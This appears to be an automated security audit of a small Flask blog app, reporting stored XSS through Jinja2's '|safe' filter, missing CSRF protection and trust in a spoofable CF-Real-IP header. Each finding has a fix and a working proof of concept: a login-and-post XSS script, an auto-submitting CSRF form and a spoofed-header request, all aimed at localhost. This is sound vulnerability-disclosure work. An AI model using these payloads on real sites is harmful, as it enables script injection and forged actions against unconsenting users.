====

Auto Security Analysis of blog-eletrix-fr at 2025-01-24
CRITICAL - Stored Cross-Site Scripting (XSS)
The application allows users to create blog posts containing arbitrary HTML and JavaScript. When these posts are viewed, the content is rendered using the `|safe` filter in Jinja2, which prevents escaping. This allows an attacker with login credentials (or via CSRF) to inject malicious scripts that execute in the context of other users' browsers.

PoC
```python
import urllib.request
import urllib.parse
import http.cookiejar

# Setup cookie jar to handle sessions
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

base_url = "http://127.0.0.1:5000"

def login():
    login_url = f"{base_url}/login"
    data = urllib.parse.urlencode({'username': 'admin', 'password': 'admin'}).encode('utf-8')
    req = urllib.request.Request(login_url, data=data)
    with opener.open(req) as response:
        return response.read()

def create_post(title, content):
    create_url = f"{base_url}/create_post"
    data = urllib.parse.urlencode({
        'title': title,
        'author': 'hacker',
        'tags': 'xss',
        'content': content
    }).encode('utf-8')
    req = urllib.request.Request(create_url, data=data)
    with opener.open(req) as response:
        return response.read()

if __name__ == "__main__":
    login()
    title = "xss_test"
    payload = "This is a test post with XSS: <script>alert('XSS')</script>"
    create_post(title, payload)
    print(f"XSS payload created at {base_url}/post/{title}")
```

Fix
Remove the `|safe` filter from `html/post.html` and use a dedicated library like `bleach` to sanitize the HTML output of the markdown renderer before passing it to the template.

====

MEDIUM - Lack of CSRF Protection
The application does not implement Cross-Site Request Forgery (CSRF) protection on critical state-changing routes such as `/login`, `/create_post`, and `/upload`. This allows an attacker to perform actions on behalf of a logged-in user without their consent by tricking them into visiting a malicious website.

PoC
```html
<!-- Malicious HTML page that CSRFs a logged-in admin to create a post -->
<form action="http://127.0.0.1:5000/create_post" method="POST">
  <input type="hidden" name="title" value="CSRF_Post" />
  <input type="hidden" name="author" value="hacker" />
  <input type="hidden" name="tags" value="csrf" />
  <input type="hidden" name="content" value="This post was created via CSRF!" />
</form>
<script>document.forms[0].submit();</script>
```

Fix
Use `flask-wtf` or a similar extension to implement CSRF tokens in all POST forms and verify them on the server side.

====

LOW - IP Spoofing via CF-Real-IP
The application trusts the `CF-Real-IP` header from any incoming request to determine the user's IP address. This header can be easily spoofed by an attacker, leading to incorrect logging or potential bypass of IP-based security measures if they existed.

PoC
```python
import urllib.request
base_url = "http://127.0.0.1:5000"
req = urllib.request.Request(base_url)
req.add_header('CF-Real-IP', '13.37.13.37')
with urllib.request.urlopen(req) as response:
    print("Request sent with spoofed IP header.")
```

Fix
Configure the application to only trust `CF-Real-IP` if the request originates from a known and trusted proxy (like Cloudflare's IP ranges).

====

Summary:
| Severity | Exploit Name |
| --- | --- |
| CRITICAL | Stored Cross-Site Scripting (XSS) |
| MEDIUM | Lack of CSRF Protection |
| LOW | IP Spoofing via CF-Real-IP |
